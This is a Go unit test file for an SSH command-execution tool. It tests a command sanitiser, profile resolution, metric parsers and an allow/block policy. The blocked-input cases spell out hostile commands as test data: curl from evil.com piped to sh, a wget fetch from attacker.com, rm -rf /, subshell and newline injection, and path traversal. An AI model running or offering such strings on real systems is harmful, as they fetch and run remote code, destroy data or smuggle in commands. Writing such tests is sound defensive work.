package main

import (
	"fmt"
	"regexp"
	"strings"
	"testing"
)

// ─────────────────────────────────────────────────────────────────────────────
// Command sanitiser unit tests
// ─────────────────────────────────────────────────────────────────────────────

func TestSanitiseCommand_AllowsCleanCommands(t *testing.T) {
	cases := []string{
		"ls -la /var/www",
		"df -h",
		"free -m",
		"ps aux",
		"ss -tulpn",
		"systemctl status nginx",
		"journalctl -u myapp -n 100 --no-pager",
		"cat /etc/nginx/nginx.conf",
		"tail -f /var/log/syslog",
		"git log --oneline -20",
		"npm run build",
	}
	for _, cmd := range cases {
		t.Run(cmd, func(t *testing.T) {
			out, err := sanitiseCommand(cmd)
			if err != nil {
				t.Errorf("expected no error for %q, got: %v", cmd, err)
			}
			if strings.TrimSpace(cmd) != out {
				t.Errorf("expected trimmed command, got %q", out)
			}
		})
	}
}

func TestSanitiseCommand_BlocksDangerousTokens(t *testing.T) {
	cases := []struct {
		cmd    string
		reason string
	}{
		{"ls -la; rm -rf /", "semicolon chaining"},
		{"echo ok && curl evil.com/malware | sh", "AND chaining"},
		{"ls || wget attacker.com/payload", "OR chaining"},
		{"echo `id`", "backtick subshell"},
		{"echo $(whoami)", "dollar subshell"},
		{"ls -la;echo injected", "semicolon without space"},
		{"echo hello\nrm -rf /", "newline injection"},
		{"cat file\r\nevil_cmd", "crlf injection"},
	}
	for _, tc := range cases {
		t.Run(tc.reason, func(t *testing.T) {
			_, err := sanitiseCommand(tc.cmd)
			if err == nil {
				t.Errorf("expected error for %q (%s), got nil", tc.cmd, tc.reason)
			}
		})
	}
}

func TestSanitiseCommand_TrimsWhitespace(t *testing.T) {
	cmd := "  df -h  "
	out, err := sanitiseCommand(cmd)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if out != "df -h" {
		t.Errorf("expected trimmed output, got %q", out)
	}
}

// ─────────────────────────────────────────────────────────────────────────────
// Pool key tests
// ─────────────────────────────────────────────────────────────────────────────

func TestPoolKey(t *testing.T) {
	key := poolKey("deploy", "example.com", 22)
	expected := "deploy@example.com:22"
	if key != expected {
		t.Errorf("expected %q, got %q", expected, key)
	}
}

func TestPoolKey_NonStandardPort(t *testing.T) {
	key := poolKey("ubuntu", "staging.example.com", 2222)
	expected := "ubuntu@staging.example.com:2222"
	if key != expected {
		t.Errorf("expected %q, got %q", expected, key)
	}
}

// ─────────────────────────────────────────────────────────────────────────────
// Profile resolution tests
// ─────────────────────────────────────────────────────────────────────────────

func TestResolveProfile_ExplicitFields(t *testing.T) {
	p, err := resolveProfile("", "myhost.com", "root", 22)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if p.Host != "myhost.com" || p.User != "root" || p.Port != 22 {
		t.Errorf("unexpected profile: %+v", p)
	}
}

func TestResolveProfile_DefaultPort(t *testing.T) {
	p, err := resolveProfile("", "myhost.com", "root", 0)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if p.Port != 22 {
		t.Errorf("expected default port 22, got %d", p.Port)
	}
}

func TestResolveProfile_MissingHostAndUser(t *testing.T) {
	_, err := resolveProfile("", "", "", 0)
	if err == nil {
		t.Error("expected error for empty host+user, got nil")
	}
}

func TestResolveProfile_UnknownAlias(t *testing.T) {
	_, err := resolveProfile("nonexistent-alias", "", "", 0)
	if err == nil {
		t.Error("expected error for unknown alias, got nil")
	}
}

func TestResolveProfile_KnownAlias(t *testing.T) {
	RegisterProfileForTest("test-alias", &HostProfile{
		Alias: "test-alias",
		Host:  "10.0.0.1",
		Port:  22,
		User:  "admin",
	})
	defer DeleteProfileForTest("test-alias")

	p, err := resolveProfile("test-alias", "", "", 0)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if p.Host != "10.0.0.1" {
		t.Errorf("expected host 10.0.0.1, got %q", p.Host)
	}
}

// ─────────────────────────────────────────────────────────────────────────────
// expandTilde tests
// ─────────────────────────────────────────────────────────────────────────────

func TestExpandTilde_NoTilde(t *testing.T) {
	path := "/absolute/path"
	result := expandTilde(path)
	if result != path {
		t.Errorf("expected unchanged path, got %q", result)
	}
}

func TestExpandTilde_WithTilde(t *testing.T) {
	result := expandTilde("~/.ssh/id_rsa")
	if strings.HasPrefix(result, "~") {
		t.Errorf("expected tilde to be expanded, got %q", result)
	}
	if !strings.HasSuffix(result, ".ssh/id_rsa") && !strings.HasSuffix(result, `.ssh\id_rsa`) {
		t.Errorf("expected path to end with .ssh/id_rsa, got %q", result)
	}
}

// ─────────────────────────────────────────────────────────────────────────────
// dangerousTokens regex tests (direct)
// ─────────────────────────────────────────────────────────────────────────────

var tokenTests = []struct {
	input   string
	matches bool
}{
	{`ls -la`, false},
	{`ls; rm -rf /`, true},
	{`a && b`, true},
	{`a || b`, true},
	{"echo `id`", true},
	{`echo $(id)`, true},
}

func TestDangerousTokensRegex(t *testing.T) {
	for _, tt := range tokenTests {
		match := dangerousTokens.MatchString(tt.input)
		if match != tt.matches {
			t.Errorf("input=%q: expected matches=%v, got %v", tt.input, tt.matches, match)
		}
	}
}

// ─────────────────────────────────────────────────────────────────────────────
// formatExecResult tests
// ─────────────────────────────────────────────────────────────────────────────

func TestFormatExecResult_StdoutOnly(t *testing.T) {
	r := &execResult{Stdout: "hello world\n", Stderr: "", ExitCode: 0}
	out := formatExecResult(r)
	if !strings.Contains(out, "STDOUT:") {
		t.Error("expected STDOUT label")
	}
	if strings.Contains(out, "STDERR:") {
		t.Error("unexpected STDERR label when stderr is empty")
	}
	if !strings.Contains(out, "Exit code: 0") {
		t.Error("expected exit code 0")
	}
}

func TestFormatExecResult_BothStreams(t *testing.T) {
	r := &execResult{Stdout: "ok\n", Stderr: "warning\n", ExitCode: 1}
	out := formatExecResult(r)
	if !strings.Contains(out, "STDOUT:") || !strings.Contains(out, "STDERR:") {
		t.Error("expected both stream labels")
	}
	if !strings.Contains(out, "Exit code: 1") {
		t.Error("expected exit code 1")
	}
}

// Ensure the dangerousTokens regex compiles (used as a reference in main package).
var _ = regexp.MustCompile
var _ = fmt.Sprintf

// ─────────────────────────────────────────────────────────────────────────────
// NEW ENHANCEMENTS UNIT TESTS
// ─────────────────────────────────────────────────────────────────────────────

func TestParseMemoryBytes(t *testing.T) {
	mockFreeOutput := `               total        used        free      shared  buff/cache   available
Mem:     16723423232  8342345232  1234567890   123456789  7146510110  8123456789
Swap:     8589930496   234567890  8355362606
`
	v := parseMemoryBytes(mockFreeOutput)
	if v.Total != 16723423232 {
		t.Errorf("expected Total 16723423232, got %d", v.Total)
	}
	if v.Used != 8342345232 {
		t.Errorf("expected Used 8342345232, got %d", v.Used)
	}
	if v.Free != 1234567890 {
		t.Errorf("expected Free 1234567890, got %d", v.Free)
	}
	expectedPct := (float64(8342345232) / float64(16723423232)) * 100.0
	if v.PercentUsed != expectedPct {
		t.Errorf("expected PercentUsed %f, got %f", expectedPct, v.PercentUsed)
	}
}

func TestParseDisks(t *testing.T) {
	mockDfOutput := `Filesystem      1B-blocks       Used  Available Use% Mounted on
/dev/sda1     10485760000 5242880000 5242880000  50% /
tmpfs          1048576000          0 1048576000   0% /dev/shm
/dev/sdb2     20971520000 2097152000 18874368000  10% /data
`
	disks := parseDisks(mockDfOutput)
	if len(disks) != 2 {
		t.Errorf("expected 2 physical disks parsed, got %d", len(disks))
	}
	if disks[0].Mount != "/" || disks[0].TotalBytes != 10485760000 || disks[0].PercentUsed != 50.0 {
		t.Errorf("unexpected parsing for root disk: %+v", disks[0])
	}
	if disks[1].Mount != "/data" || disks[1].TotalBytes != 20971520000 || disks[1].PercentUsed != 10.0 {
		t.Errorf("unexpected parsing for data disk: %+v", disks[1])
	}
}

func TestParseLoadAverages(t *testing.T) {
	mockLoadavg := "0.12 0.05 0.01 1/1234 56789"
	loads := parseLoadAverages(mockLoadavg)
	if len(loads) != 3 {
		t.Errorf("expected 3 load averages parsed, got %d", len(loads))
	}
	if loads[0] != 0.12 || loads[1] != 0.05 || loads[2] != 0.01 {
		t.Errorf("unexpected load averages: %v", loads)
	}
}

func TestParseUptime(t *testing.T) {
	mockUptime := "86400.12 123456.78"
	uptime := parseUptime(mockUptime)
	if uptime != 86400 {
		t.Errorf("expected uptime 86400, got %d", uptime)
	}
}

func TestParseOSName(t *testing.T) {
	mockOSRelease := `NAME="Ubuntu"
VERSION="22.04 LTS (Jammy Jellyfish)"
ID=ubuntu
PRETTY_NAME="Ubuntu 22.04 LTS"
`
	name := parseOSName(mockOSRelease)
	if name != "Ubuntu 22.04 LTS" {
		t.Errorf("expected 'Ubuntu 22.04 LTS', got %q", name)
	}
}

func TestValidateCommandPolicy(t *testing.T) {
	allowedRe1 := regexp.MustCompile("^ls -la.*$")
	allowedRe2 := regexp.MustCompile("^df -h$")
	blockedRe1 := regexp.MustCompile(".*rm -rf.*")

	profile := &HostProfile{
		allowedRegexes: []*regexp.Regexp{allowedRe1, allowedRe2},
		blockedRegexes: []*regexp.Regexp{blockedRe1},
	}

	cmd, err := validateCommandPolicy(profile, "ls -la /var")
	if err != nil || cmd != "ls -la /var" {
		t.Errorf("expected 'ls -la /var' to pass, got error: %v", err)
	}

	_, err = validateCommandPolicy(profile, "pwd")
	if err == nil {
		t.Error("expected 'pwd' to be rejected by whitelist, got no error")
	}

	_, err = validateCommandPolicy(profile, "ls -la; rm -rf /")
	if err == nil {
		t.Error("expected command to be blocked, but it passed")
	}
}

func TestIsValidProcessID(t *testing.T) {
	cases := []struct {
		id    string
		valid bool
	}{
		{"proc_12345", true},
		{"task-1", true},
		{"task_1-abc", true},
		{"task;rm -rf", false},
		{"../etc/passwd", false},
		{"", false},
	}
	for _, tc := range cases {
		if isValidProcessID(tc.id) != tc.valid {
			t.Errorf("expected isValidProcessID(%q) = %v, got %v", tc.id, tc.valid, !tc.valid)
		}
	}
}
